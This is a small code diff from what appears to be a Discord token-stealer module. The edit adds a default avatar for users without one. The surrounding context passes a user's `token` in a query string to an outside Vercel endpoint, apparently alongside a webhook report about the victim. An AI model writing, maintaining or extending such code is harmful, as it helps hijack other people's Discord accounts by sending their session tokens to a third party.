@@ -34,13 +34,17 @@ module.exports = async (webhook) => {
                 const avatarUrlPng = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
 
                 let avatar;
-                try {
-                    const avatarResponse = await axios.get(avatarUrlGif);
-                    if (avatarResponse.status === 200) {
-                        avatar = avatarUrlGif;
+                if(user.avatar) {
+                    try {
+                        const avatarResponse = await axios.get(avatarUrlGif);
+                        if (avatarResponse.status === 200) {
+                            avatar = avatarUrlGif;
+                        }
+                    } catch (error) {
+                        avatar = avatarUrlPng
                     }
-                } catch (error) {
-                    avatar = avatarUrlPng
+                } else {
+                    avatar = `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`
                 }
 
                 let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
